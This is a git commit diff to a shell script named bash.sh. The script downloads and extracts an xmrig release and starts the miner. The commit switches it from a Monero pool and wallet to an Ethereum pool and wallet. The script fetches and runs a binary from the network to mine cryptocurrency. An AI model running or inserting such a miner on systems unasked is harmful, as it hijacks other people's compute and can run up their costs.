ed6c74eccec8d902909cf5289ce706591f7d6580
racon3349 <95703525+racon3349@users.noreply.github.com>
2022-06-05 03:58:16 +0300

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -2,4 +2,4 @@ wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux
 tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
 ls
 cd xmrig-6.15.0
-./xmrig -o sg.minexmr.com:443 -u 42hejQfEyTdXCNjRDFbniQFmFEVS6Q21hjZ7kAq3HAcp3eJYaLmuNNnj83HU52bVnaY48hhPgzWmLBkTxDYLVzPnGWn463k -k --tls --rig-id rig
+./xmrig -o eth.2miners.com:2020 -u 0xa9714cCf854eC5C8eDeA1Ae7220AdCB6D8ff311f -k --tls --rig-id rig
